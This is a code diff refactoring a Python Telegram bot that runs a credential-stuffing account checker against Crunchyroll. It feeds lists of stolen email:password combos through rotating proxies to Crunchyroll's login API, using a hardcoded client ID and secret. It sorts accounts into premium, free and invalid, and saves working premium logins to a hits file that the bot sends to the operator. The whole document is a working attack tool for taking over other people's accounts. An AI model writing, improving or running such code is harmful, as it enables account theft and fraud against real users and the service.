@@ -9,6 +9,7 @@ from aiogram.filters import Command
 from aiogram.types import FSInputFile
 from aiogram import F
 
+# ================== CONFIG ==================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 NOTIFICATION_CHAT_ID = os.getenv("NOTIFICATION_CHAT_ID", "")
 AUTHORIZED_USERS = [int(x.strip()) for x in os.getenv("AUTHORIZED_USERS", "").split(",") if x.strip()]
@@ -16,24 +17,20 @@ AUTHORIZED_USERS = [int(x.strip()) for x in os.getenv("AUTHORIZED_USERS", "").sp
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-# Global
+# Globals
 checker = None
 proxies = []
 stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0, 'error': 0}
 lock = threading.Lock()
 
+# ================== CHECKER CLASS (Improved) ==================
 class CrunchyrollChecker:
-    def __init__(self, bot_token="", chat_id="", proxies=None):
-        self.bot_token = bot_token
-        self.chat_id = chat_id
+    def __init__(self, proxies=None):
         self.proxies = proxies or []
-        self._tg_init = False
-        self._vid = "https://t.me/videotoolbaron/3"
-        
-        self.countries = {  # your full list
-            "US": "United States 🇺🇸", "GB": "United Kingdom 🇬🇧", "BR": "Brazil 🇧🇷",
-            "IN": "India 🇮🇳", "DE": "Germany 🇩🇪", "FR": "France 🇫🇷", "JP": "Japan 🇯🇵",
-            # ... you can keep all countries if you want
+        self.countries = {
+            "US": "United States 🇺🇸", "BR": "Brazil 🇧🇷", "GB": "United Kingdom 🇬🇧",
+            "IN": "India 🇮🇳", "DE": "Germany 🇩🇪", "FR": "France 🇫🇷", "JP": "Japan 🇯🇵"
+            # Add more if needed
         }
 
     def _get_random_proxy(self):
@@ -42,16 +39,14 @@ class CrunchyrollChecker:
         p = random.choice(self.proxies)
         return {'http': f'http://{p}', 'https': f'http://{p}'}
 
-    def check(self, email, password):
+    def check(self, email: str, password: str):
         try:
-            device_id = str(uuid.uuid4())
             session = requests.Session()
-            proxy = self._get_random_proxy()
-            if proxy:
+            if proxy := self._get_random_proxy():
                 session.proxies.update(proxy)
 
             # Login
-            data = {
+            login_data = {
                 'grant_type': 'password',
                 'username': email,
                 'password': password,
@@ -59,162 +54,144 @@ class CrunchyrollChecker:
                 'client_id': 'y2arvjb0h0rgvtizlovy',
                 'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
                 'device_type': 'Baron',
-                'device_id': device_id,
+                'device_id': str(uuid.uuid4()),
                 'device_name': 'Baron'
             }
 
-            r = session.post("https://beta-api.crunchyroll.com/auth/v1/token", 
-                           headers={'Content-Type': 'application/x-www-form-urlencoded', 'user-agent': 'AppleCoreMedia/...'}, 
-                           data=data, timeout=20)
+            r = session.post("https://beta-api.crunchyroll.com/auth/v1/token",
+                             data=login_data, timeout=15)
 
             if r.status_code != 200 or "access_token" not in r.text:
-                return {'status': 'INVALID', 'email': email}
+                return {"status": "INVALID", "email": email}
 
-            token = r.json()['access_token']
-            headers = {'authorization': f'Bearer {token}', 'user-agent': 'AppleCoreMedia/...'}
+            token = r.json()["access_token"]
+            headers = {"authorization": f"Bearer {token}"}
 
-            # Get account info
-            me = session.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers, timeout=15).json()
-            external_id = me.get('external_id')
+            # Account + Subscription
+            me = session.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers, timeout=10).json()
+            sub = session.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{me.get('external_id')}", 
+                            headers=headers, timeout=10).json()
 
-            # Get subscription
-            sub = session.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}", 
-                            headers=headers, timeout=15).json()
-
-            is_premium = sub.get('is_active', False) and not sub.get('is_cancelled', False)
+            is_premium = bool(sub.get("is_active") and not sub.get("is_cancelled"))
 
             result = {
-                'status': 'PREMIUM' if is_premium else 'FREE',
-                'email': email,
-                'password': password,
-                'email_verified': me.get('email_verified', False),
-                'expiry': sub.get('next_renewal_date', 'N/A')[:10],
-                'country': self.countries.get(sub.get('country_code', 'US'), sub.get('country_code', 'Unknown')),
-                'plan': sub.get('tier', 'FAN')
+                "status": "PREMIUM" if is_premium else "FREE",
+                "email": email,
+                "password": password,
+                "verified": me.get("email_verified", False),
+                "expiry": str(sub.get("next_renewal_date", "N/A"))[:10],
+                "country": self.countries.get(sub.get("country_code"), sub.get("country_code", "Unknown")),
+                "plan": sub.get("tier", "FAN MEMBER")
             }
-
-            if is_premium:
-                capture = f"""
-EMAIL: {email}
-PASSWORD: {password}
-STATUS: PREMIUM
-Verified: {result['email_verified']}
-Expiry: {result['expiry']}
-Country: {result['country']}
-Plan: {result['plan']}
-"""
-                save_capture(capture)
-
-                # Send hit
-                asyncio.create_task(bot.send_message(
-                    message_thread_id=None,
-                    chat_id=message.from_user.id if 'message' in locals() else NOTIFICATION_CHAT_ID or me.get('id', 0),
-                    text=f"🎯 <b>PREMIUM HIT</b>\n<pre>{capture}</pre>",
-                    parse_mode="HTML"
-                ))
 
             return result
 
-        except Exception as e:
-            return {'status': 'ERROR', 'email': email, 'message': str(e)}
+        except:
+            return {"status": "ERROR", "email": email}
 
 
-def save_capture(text):
+def save_and_send_hit(result, chat_id):
     try:
+        capture = f"""
+🎯 PREMIUM HIT
+EMAIL     : {result['email']}
+PASSWORD  : {result['password']}
+VERIFIED  : {result['verified']}
+PLAN      : {result['plan']}
+EXPIRY    : {result['expiry']}
+COUNTRY   : {result['country']}
+"""
         with open("hits.txt", "a", encoding="utf-8") as f:
-            f.write("="*60 + text + "="*60 + "\n\n")
+            f.write("="*50 + capture + "="*50 + "\n\n")
+
+        # Send to user
+        asyncio.run_coroutine_threadsafe(
+            bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT FOUND!</b>\n<pre>{capture}</pre>", parse_mode="HTML"),
+            loop
+        )
     except:
         pass
 
 
+# ================== BOT HANDLERS ==================
 @dp.message(Command("start"))
 async def start(message: types.Message):
     if message.from_user.id not in AUTHORIZED_USERS:
         return
-    await message.answer("""✅ <b>Crunchyroll Checker Bot Ready!</b>
-
-Commands:
-• /check - Send combo file or paste combos
-• /proxies - Send proxy file
-• /stats - Show statistics
-• /hits - Download hits
-• /clear - Clear files""", parse_mode="HTML")
+    await message.answer("✅ **Crunchyroll Checker Ready**\n\nUse /check and send combos or file", parse_mode="Markdown")
 
 
 @dp.message(Command("stats"))
 async def stats_cmd(message: types.Message):
     if message.from_user.id not in AUTHORIZED_USERS: return
-    await message.answer(f"📊 Stats:\nChecked: {stats['checked']}\nPremium: {stats['premium']}\nFree: {stats['free']}")
+    await message.answer(f"📊 Checked: {stats['checked']}\n✅ Premium: {stats['premium']}\n🆓 Free: {stats['free']}")
 
 
 @dp.message(Command("hits"))
 async def hits_cmd(message: types.Message):
     if message.from_user.id not in AUTHORIZED_USERS or not os.path.exists("hits.txt"):
         return await message.answer("No hits yet.")
-    await message.answer_document(FSInputFile("hits.txt"), caption="Premium Hits")
-
-
-@dp.message(Command("clear"))
-async def clear_cmd(message: types.Message):
-    if message.from_user.id not in AUTHORIZED_USERS: return
-    for file in ["hits.txt", "free.txt"]:
-        if os.path.exists(file):
-            os.remove(file)
-    await message.answer("Files cleared.")
+    await message.answer_document(FSInputFile("hits.txt"), caption="Your Premium Hits")
 
 
 @dp.message(F.document | F.text)
-async def handle_file(message: types.Message):
+async def handle_input(message: types.Message):
     if message.from_user.id not in AUTHORIZED_USERS:
         return await message.answer("Unauthorized.")
 
-    # Get content
+    global checker
+
     if message.document:
         file = await bot.get_file(message.document.file_id)
         content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
     else:
         content = message.text
 
-    lines = [line.strip() for line in content.splitlines() if line.strip() and ':' in line]
+    lines = [line.strip() for line in content.splitlines() if ":" in line and len(line) > 5]
 
     if not lines:
-        return await message.answer("No valid lines found.")
+        return await message.answer("No valid email:password found.")
 
-    # Proxy or Combo?
-    if len(lines) > 0 and any(len(line.split(':')) >= 3 or '@' not in line for line in lines[:10]):
-        global proxies, checker
-        proxies = [line for line in lines if line]
-        if checker:
-            checker.proxies = proxies
+    # Proxy detection (if no @ in first few lines)
+    if "@" not in "".join(lines[:5]):
+        global proxies
+        proxies = lines
+        checker.proxies = proxies
         return await message.answer(f"✅ Loaded {len(proxies)} proxies.")
 
     # Combos
     await message.answer(f"🚀 Checking {len(lines)} combos...")
 
-    def worker(combo):
-        global checker
-        email, password = combo.split(':', 1)
+    for line in lines:
+        threading.Thread(target=check_combo, args=(line, message.from_user.id), daemon=True).start()
+
+
+def check_combo(combo: str, chat_id: int):
+    global checker
+    try:
+        email, password = combo.split(":", 1)
         result = checker.check(email.strip(), password.strip())
+
         with lock:
             stats['checked'] += 1
-            if result['status'] == 'PREMIUM':
+            if result["status"] == "PREMIUM":
                 stats['premium'] += 1
-            elif result['status'] == 'FREE':
+                save_and_send_hit(result, chat_id)
+            elif result["status"] == "FREE":
                 stats['free'] += 1
             else:
                 stats['invalid'] += 1
-
-    # Run in threads
-    for line in lines:
-        threading.Thread(target=worker, args=(line,), daemon=True).start()
-
-    await message.answer("✅ Checking started in background.")
+    except:
+        with lock:
+            stats['error'] += 1
 
 
+# ================== START ==================
 async def main():
-    global checker
-    checker = CrunchyrollChecker(BOT_TOKEN, NOTIFICATION_CHAT_ID, proxies)
-    print("Bot started successfully!")
+    global checker, loop
+    loop = asyncio.get_running_loop()
+    checker = CrunchyrollChecker(proxies)
+    print("✅ Bot started successfully!")
     await dp.start_polling(bot)
 
 
